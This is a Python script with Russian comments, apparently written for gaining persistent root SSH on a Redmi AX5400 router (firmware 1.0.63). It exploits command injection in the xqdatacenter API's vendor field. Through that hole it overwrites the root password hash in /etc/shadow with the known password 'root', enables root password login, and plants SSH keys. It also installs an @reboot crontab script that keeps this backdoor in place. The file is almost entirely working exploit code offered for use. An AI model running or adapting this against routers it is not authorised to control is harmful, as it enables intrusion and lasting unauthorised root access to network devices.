#!/usr/bin/env python3
"""
root_access.py — получение постоянного SSH-доступа к Redmi AX5400 (fw 1.0.63)

Эксплойт: инъекция команд через xqdatacenter/request (vendor field, api=7).
Обходит hackCheck=3, который блокирует все остальные API-методы.

Что делает скрипт:
  1. Записывает известный MD5-хеш пароля 'root' в /etc/shadow через инъекцию
  2. Включает PasswordAuth/RootPasswordAuth в UCI (persistent — ubifs)
  3. Перезапускает dropbear
  4. Через SSH-сессию по паролю:
     — записывает ваш pubkey в /data/.ssh/authorized_keys (ubifs, persistent)
     — монтирует tmpfs на /root (squashfs read-only), создаёт /root/.ssh/
     — копирует ключ в /etc/dropbear/authorized_keys (primary path этой сборки)
  5. Создаёт /data/fix_ssh.sh — скрипт восстановления при загрузке
  6. Регистрирует его в crontab @reboot (/etc/crontabs — ubifs, persistent)

Использование:
  1. Заполните ROUTER, PASSWORD, DEVICE_ID ниже
  2. Убедитесь, что ~/.ssh/id_rsa.pub существует (ssh-keygen -t rsa -b 4096)
  3. python3 root_access.py

Зависимости: только stdlib Python 3; утилита sshpass (brew/apt install sshpass)
"""

import hashlib, os, subprocess, sys, time, random, urllib.request, urllib.parse, json

ROUTER    = "192.168.31.1"
PASSWORD  = "ВАШ_ПАРОЛЬ"           # пароль от веб-интерфейса admin
KEY       = "a2ffa5c9be07488bbb04a3a47d3c5f6a"  # захардкожен в прошивке
DEVICE_ID = "xx:xx:xx:xx:xx:xx"    # MAC роутера (с наклейки, нижний регистр)

PUBKEY_FILE = os.path.expanduser("~/.ssh/id_rsa.pub")

# Хеш пароля 'root' (MD5-crypt, соль abc12345).
# Чтобы задать другой пароль: openssl passwd -1 -salt 'СОЛЬ' 'ПАРОЛЬ'
SHADOW_HASH = r"$1$abc12345$fI/LqEN2aS.f6FKbVvNy./"

SSH_OPTS = [
    "-o", "HostKeyAlgorithms=ssh-rsa",
    "-o", "PubkeyAcceptedAlgorithms=ssh-rsa",
    "-o", "StrictHostKeyChecking=no",
    "-o", "ConnectTimeout=5",
]

# ──────────────────────────────────────────────────────────

def sha1(s):
    return hashlib.sha1(s.encode()).hexdigest()


def login():
    for _ in range(3):
        try:
            nonce = f"0_{DEVICE_ID}_{int(time.time())}_{random.randint(0, 9999)}"
            pwd   = sha1(nonce + sha1(PASSWORD + KEY))
            data  = urllib.parse.urlencode(
                {"username": "admin", "password": pwd,
                 "logtype": "2", "nonce": nonce}
            ).encode()
            resp = json.loads(urllib.request.urlopen(
                urllib.request.Request(
                    f"http://{ROUTER}/cgi-bin/luci/api/xqsystem/login",
                    data=data, method="POST"),
                timeout=5).read())
            if resp.get("code") == 0:
                return resp["token"]
            time.sleep(2)
        except Exception:
            time.sleep(2)
    raise RuntimeError("Логин не удался после 3 попыток")


def dc7(token, cmd, timeout=6):
    """Инъекция команды через vendor-поле datacenter API."""
    p = json.dumps(
        {"api": 7, "dev": "a", "vendor": f";{cmd};#", "type": "a"},
        separators=(",", ":"))
    url  = f"http://{ROUTER}/cgi-bin/luci/;stok={token}/api/xqdatacenter/request"
    data = urllib.parse.urlencode({"payload": p}).encode()
    try:
        return urllib.request.urlopen(
            urllib.request.Request(url, data=data, method="POST"),
            timeout=timeout).read().decode(errors="replace")
    except Exception as e:
        return f"ERR:{e}"


def ssh_open():
    return subprocess.run(
        ["nc", "-z", "-w", "3", ROUTER, "22"], capture_output=True
    ).returncode == 0


def ssh_run(cmd, use_key=False, input_data=None):
    args = (["ssh"] + SSH_OPTS + ["-i", os.path.expanduser("~/.ssh/id_rsa")]
            if use_key else
            ["sshpass", "-p", "root", "ssh"] + SSH_OPTS)
    r = subprocess.run(
        args + [f"root@{ROUTER}", cmd],
        input=input_data, capture_output=True, text=True, timeout=20
    )
    return r.returncode, r.stdout.strip(), r.stderr.strip()


# ──────────────────────────────────────────────────────────

def main():
    print("=" * 58)
    print("  Redmi AX5400 — получение root SSH (fw 1.0.63)")
    print("=" * 58)

    if not os.path.exists(PUBKEY_FILE):
        print(f"\n[!] Файл {PUBKEY_FILE} не найден.")
        print("    Создайте ключ: ssh-keygen -t rsa -b 4096")
        sys.exit(1)
    pubkey = open(PUBKEY_FILE).read().strip()
    print(f"\n[ключ] {pubkey[:60]}...")

    # 1. Вписываем известный хеш пароля в /etc/shadow
    print("\n[1] Устанавливаем хеш пароля root в /etc/shadow...")
    tok = login()
    r = dc7(tok, f"sed -i 's|^root:[^:]*:|root:{SHADOW_HASH}:|' /etc/shadow")
    print(f"    {r[:60]}")
    time.sleep(0.5)

    # 2. Разрешаем парольный вход через UCI (записывается в ubifs /etc/config)
    print("\n[2] UCI: PasswordAuth=on, RootPasswordAuth=on...")
    tok = login()
    dc7(tok, "uci set dropbear.@dropbear[0].PasswordAuth=on && uci commit dropbear")
    time.sleep(0.3)
    tok = login()
    dc7(tok, "uci set dropbear.@dropbear[0].RootPasswordAuth=on && uci commit dropbear")
    time.sleep(0.3)

    # 3. Перезапускаем dropbear
    print("\n[3] Перезапуск dropbear...")
    tok = login()
    dc7(tok, "killall dropbear", timeout=4)
    time.sleep(0.8)
    tok = login()
    dc7(tok, "/etc/init.d/dropbear start", timeout=8)
    time.sleep(2.5)

    if not ssh_open():
        print("    init.d не помог, запускаем dropbear напрямую...")
        tok = login()
        dc7(tok, "/usr/sbin/dropbear -R -p 22", timeout=6)
        time.sleep(2)

    if not ssh_open():
        print("\n    ОШИБКА: SSH не запустился. Проверьте инъекцию (verify_dc7.py).")
        sys.exit(1)
    print("    [+] порт 22 открыт")

    # 4. Записываем pubkey через stdin-pipe (sftp-сервера нет)
    print("\n[4] Записываем SSH-ключ в /data/.ssh/ (ubifs, persistent)...")
    subprocess.run(["ssh-keygen", "-R", ROUTER], capture_output=True)
    r = subprocess.run(
        ["sshpass", "-p", "root", "ssh"] + SSH_OPTS + [
            f"root@{ROUTER}",
            "mkdir -p /data/.ssh && chmod 700 /data/.ssh && "
            "cat > /data/.ssh/authorized_keys && chmod 600 /data/.ssh/authorized_keys"
        ],
        input=pubkey, capture_output=True, text=True, timeout=15
    )
    if r.returncode != 0:
        print(f"    ОШИБКА: {r.stderr[:80]}")
        sys.exit(1)
    print("    [+] ключ записан")

    # 5. Настраиваем /root/.ssh и /etc/dropbear/authorized_keys
    #    Важно: эта сборка dropbear v2017.75 читает именно /etc/dropbear/authorized_keys,
    #    а не ~/.ssh/authorized_keys (нашли через strings /usr/sbin/dropbear).
    #    /root — squashfs read-only; обходим через tmpfs поверх.
    print("\n[5] Настраиваем /root/.ssh и /etc/dropbear/authorized_keys...")
    setup_cmd = (
        "mount -t tmpfs tmpfs /root -o size=512k,mode=700 2>/dev/null || true && "
        "mkdir -p /root/.ssh && chmod 700 /root/.ssh && "
        "cp /data/.ssh/authorized_keys /root/.ssh/authorized_keys && "
        "chmod 600 /root/.ssh/authorized_keys && "
        "mkdir -p /etc/dropbear && "
        "cp /data/.ssh/authorized_keys /etc/dropbear/authorized_keys && "
        "chmod 600 /etc/dropbear/authorized_keys && "
        "echo ok"
    )
    rc, out, err = ssh_run(setup_cmd)
    print(f"    {'[+] ' + out if rc == 0 else '[!] ' + err[:60]}")

    # 6. Скрипт восстановления доступа после перезагрузки
    #    /etc и /root сбрасываются (ramfs/squashfs); /data и /etc/crontabs — нет (ubifs).
    print("\n[6] Создаём /data/fix_ssh.sh и @reboot crontab...")
    boot_script = (
        "#!/bin/sh\n"
        "sleep 5\n"
        "sed -i 's|^root:[^:]*:|root:" + SHADOW_HASH.replace("$", "\\$") + ":|'"
        " /etc/shadow 2>/dev/null\n"
        "mount -t tmpfs tmpfs /root -o size=512k,mode=700 2>/dev/null || true\n"
        "mkdir -p /root/.ssh && chmod 700 /root/.ssh\n"
        "cp /data/.ssh/authorized_keys /root/.ssh/authorized_keys 2>/dev/null\n"
        "chmod 600 /root/.ssh/authorized_keys 2>/dev/null || true\n"
        "mkdir -p /etc/dropbear\n"
        "cp /data/.ssh/authorized_keys /etc/dropbear/authorized_keys 2>/dev/null\n"
        "chmod 600 /etc/dropbear/authorized_keys 2>/dev/null || true\n"
        "uci set dropbear.@dropbear[0].PasswordAuth=on 2>/dev/null || true\n"
        "uci set dropbear.@dropbear[0].RootPasswordAuth=on 2>/dev/null || true\n"
        "uci commit dropbear 2>/dev/null || true\n"
        "killall dropbear 2>/dev/null || true\n"
        "sleep 1\n"
        "/etc/init.d/dropbear start 2>/dev/null || "
        "/usr/sbin/dropbear -R -p 22 2>/dev/null || true\n"
    )
    r = subprocess.run(
        ["sshpass", "-p", "root", "ssh"] + SSH_OPTS + [
            f"root@{ROUTER}",
            "cat > /data/fix_ssh.sh && chmod +x /data/fix_ssh.sh"
        ],
        input=boot_script, capture_output=True, text=True, timeout=15
    )
    if r.returncode != 0:
        print(f"    ОШИБКА: {r.stderr[:60]}")
    else:
        print("    [+] /data/fix_ssh.sh записан")

    ssh_run(
        "( crontab -l 2>/dev/null | grep -v fix_ssh; "
        "echo '@reboot /data/fix_ssh.sh' ) | crontab -"
    )
    print("    [+] crontab @reboot зарегистрирован")

    # 7. Финальный тест ключевой аутентификации
    print("\n[7] Тест SSH по ключу...")
    subprocess.run(["ssh-keygen", "-R", ROUTER], capture_output=True)
    rc, out, err = ssh_run("id && uname -m", use_key=True)
    if rc == 0:
        print(f"\n{'=' * 58}")
        print("  ✓ SSH ПО КЛЮЧУ РАБОТАЕТ")
        for line in out.splitlines():
            print(f"  {line}")
        print(f"{'=' * 58}")
    else:
        print(f"\n  Ключ не принят: {err[:80]}")
        print("  Парольный вход работает:")
        print(f"  sshpass -p root ssh -o HostKeyAlgorithms=ssh-rsa "
              f"-o PubkeyAcceptedAlgorithms=ssh-rsa root@{ROUTER}")

    print(f"""
Команда для подключения:
  ssh -o HostKeyAlgorithms=ssh-rsa \\
      -o PubkeyAcceptedAlgorithms=ssh-rsa \\
      root@{ROUTER}
""")


if __name__ == "__main__":
    main()
